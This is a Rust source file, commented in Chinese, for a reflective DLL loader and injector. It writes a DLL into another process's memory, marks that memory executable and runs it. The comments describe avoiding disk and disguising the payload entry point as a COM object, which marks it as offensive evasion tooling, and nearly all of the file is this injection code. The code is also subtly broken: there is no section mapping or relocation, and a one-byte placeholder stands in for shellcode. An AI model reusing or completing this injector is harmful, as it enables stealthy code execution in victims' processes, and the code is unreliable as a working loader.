// Reflective Loader 模块 - 在内存中加载和执行DLL
//
// 这实现了反射式DLL注入，允许在不接触磁盘的情况下在目标进程中加载DLL。
// DLL从内存中直接映射到目标进程的地址空间。

use super::memory::MemoryManager;
use super::process::TargetProcess;
use crate::ffi;
use anyhow::{bail, Context, Result};
use windows::Win32::System::Memory::*;

/// Reflective Loader 配置
pub struct ReflectiveLoaderConfig {
    /// DLL字节数据（完整的PE文件）
    pub dll_bytes: Vec<u8>,
    /// 启用详细日志
    pub verbose: bool,
}

/// 反射加载器
pub struct ReflectiveLoader {
    config: ReflectiveLoaderConfig,
}

impl ReflectiveLoader {
    /// 创建新的反射加载器
    pub fn new(dll_bytes: Vec<u8>) -> Self {
        Self {
            config: ReflectiveLoaderConfig {
                dll_bytes,
                verbose: false,
            },
        }
    }

    /// 启用详细日志
    pub fn with_verbose(mut self, verbose: bool) -> Self {
        self.config.verbose = verbose;
        self
    }

    /// 验证PE文件头
    pub fn validate_dll(&self) -> Result<()> {
        if self.config.dll_bytes.len() < 2 {
            bail!("DLL too small");
        }

        // 检查MZ头
        if self.config.dll_bytes[0] != b'M' || self.config.dll_bytes[1] != b'Z' {
            bail!("Invalid PE header: not a valid Windows executable");
        }

        // 检查最小大小
        if self.config.dll_bytes.len() < 64 {
            bail!("DLL too small to be valid");
        }

        Ok(())
    }

    /// 在目标进程中进行反射加载
    ///
    /// # 步骤
    /// 1. 验证DLL格式
    /// 2. 在目标进程中分配内存
    /// 3. 写入DLL数据
    /// 4. 设置内存保护
    /// 5. 执行入口点
    pub fn inject_into_process(&self, target_process: &TargetProcess) -> Result<*mut u8> {
        // 1. 验证DLL
        self.validate_dll()?;

        let _memory_mgr = MemoryManager::new_from_handle(target_process.process_handle);

        // 2. 在目标进程中分配内存来存储DLL
        let dll_address = ffi::allocate_virtual_memory_ex(
            target_process.process_handle,
            self.config.dll_bytes.len(),
        )
        .context("Failed to allocate memory for DLL in target process")?;

        if self.config.verbose {
            eprintln!("[*] Allocated memory at: 0x{:X}", dll_address as usize);
        }

        // 3. 写入DLL数据到目标进程
        ffi::write_virtual_memory_ex(
            target_process.process_handle,
            dll_address,
            &self.config.dll_bytes,
        )
        .context("Failed to write DLL to target process")?;

        if self.config.verbose {
            eprintln!(
                "[*] Wrote {} bytes of DLL data",
                self.config.dll_bytes.len()
            );
        }

        // 4. 设置内存为可执行
        ffi::protect_virtual_memory_ex(
            target_process.process_handle,
            dll_address,
            self.config.dll_bytes.len(),
            PAGE_EXECUTE_READ,
        )
        .context("Failed to set memory protection")?;

        if self.config.verbose {
            eprintln!("[*] Set memory protection to PAGE_EXECUTE_READ");
        }

        Ok(dll_address)
    }

    /// 在目标进程中执行DLL入口点（伪装为COM对象）
    ///
    /// 这个方法调用伪装成 DllGetClassObject 的Payload入口点
    pub fn execute_dll(
        &self,
        target_process: &TargetProcess,
        _dll_address: *mut u8,
        param: Option<&[u8]>,
    ) -> Result<u32> {
        // 创建远程线程来执行DLL代码
        // DLL应该实现DllMain或其他入口点

        let exit_code = target_process.inject_and_execute(
            &[0; 1], // 最小的shellcode占位符
            param,
        )?;

        if self.config.verbose {
            eprintln!("[*] DLL execution completed with exit code: {}", exit_code);
        }

        Ok(exit_code)
    }

    /// 完整的注入和执行流程
    ///
    /// 一站式方法来处理反射加载和DLL执行
    pub fn inject_and_execute(
        &self,
        target_process: &TargetProcess,
        param: Option<&[u8]>,
    ) -> Result<(u32, *mut u8)> {
        // 步骤1：将DLL反射加载到目标进程
        let dll_address = self.inject_into_process(target_process)?;

        if self.config.verbose {
            eprintln!("[*] Reflective DLL loaded at 0x{:X}", dll_address as usize);
        }

        // 步骤2：在目标进程中执行DLL
        let exit_code = self.execute_dll(target_process, dll_address, param)?;

        Ok((exit_code, dll_address))
    }
}

/// 通用DLL注入助手
pub struct DLLInjector {
    dll_data: Vec<u8>,
}

impl DLLInjector {
    /// 从二进制数据创建DLL注入器
    pub fn from_bytes(dll_bytes: Vec<u8>) -> Result<Self> {
        if dll_bytes.len() < 2 {
            bail!("DLL data too small");
        }

        if dll_bytes[0] != b'M' || dll_bytes[1] != b'Z' {
            bail!("Invalid PE format");
        }

        Ok(Self {
            dll_data: dll_bytes,
        })
    }

    /// 从文件加载DLL
    pub fn from_file(path: &str) -> Result<Self> {
        let dll_bytes =
            std::fs::read(path).context(format!("Failed to read DLL file: {}", path))?;
        Self::from_bytes(dll_bytes)
    }

    /// 使用反射加载器注入
    pub fn inject_reflective(&self, target_process: &TargetProcess) -> Result<*mut u8> {
        let loader = ReflectiveLoader::new(self.dll_data.clone()).with_verbose(false);
        loader.inject_into_process(target_process)
    }

    /// 直接方法：分配->写入->执行
    pub fn inject_direct(&self, target_process: &TargetProcess) -> Result<u32> {
        let memory_mgr = MemoryManager::new_from_handle(target_process.process_handle);

        // 分配内存
        let buffer = memory_mgr.allocate(self.dll_data.len())?;

        // 写入DLL
        memory_mgr.write(buffer.address(), &self.dll_data)?;

        // 设置为可执行
        memory_mgr.make_executable(buffer.address(), self.dll_data.len())?;

        // 执行
        let exit_code = target_process.inject_and_execute(&self.dll_data, None)?;

        Ok(exit_code)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_pe_validation() {
        // 有效的MZ头
        let mut valid_pe = vec![0u8; 64];
        valid_pe[0] = b'M';
        valid_pe[1] = b'Z';
        let loader = ReflectiveLoader::new(valid_pe);
        assert!(loader.validate_dll().is_ok());
    }

    #[test]
    fn test_invalid_pe_header() {
        // 无效的MZ头
        let mut invalid_pe = vec![0u8; 64];
        invalid_pe[0] = b'X';
        invalid_pe[1] = b'X';
        let loader = ReflectiveLoader::new(invalid_pe);
        assert!(loader.validate_dll().is_err());
    }

    #[test]
    fn test_too_small_dll() {
        // 太小的数据
        let small_data = vec![0; 1];
        let loader = ReflectiveLoader::new(small_data);
        assert!(loader.validate_dll().is_err());
    }

    #[test]
    fn test_dll_injector_creation() {
        let mut pe_data = vec![0u8; 128];
        pe_data[0] = b'M';
        pe_data[1] = b'Z';
        let injector = DLLInjector::from_bytes(pe_data);
        assert!(injector.is_ok());
    }

    #[test]
    fn test_dll_injector_invalid_format() {
        let mut invalid_data = vec![0u8; 128];
        invalid_data[0] = 0xFF;
        invalid_data[1] = 0xFF;
        let injector = DLLInjector::from_bytes(invalid_data);
        assert!(injector.is_err());
    }
}
